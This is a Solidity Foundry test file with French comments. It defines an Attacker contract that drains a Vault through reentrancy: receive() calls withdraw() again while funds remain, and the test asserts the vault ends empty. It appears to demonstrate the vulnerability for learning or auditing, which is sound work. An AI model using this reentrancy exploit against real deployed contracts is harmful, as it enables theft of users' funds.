
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// Contrat qui simule l'attaquant
contract Attacker {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    // Recevoir les ETH envoyes par le Vault
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    // Demarrer l'attaque
    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
}

// Contrat de test
contract VaultTest is Test {
    Vault public vault;
    Attacker public attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(address(vault));

        // Financer le test
        vm.deal(address(this), 6 ether);
   

        // Alice depose 5 ETH
        vault.deposit{value: 5 ether}();
    }

    function testReentrancyAttack() public {
        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, 6 ether);
    }
}
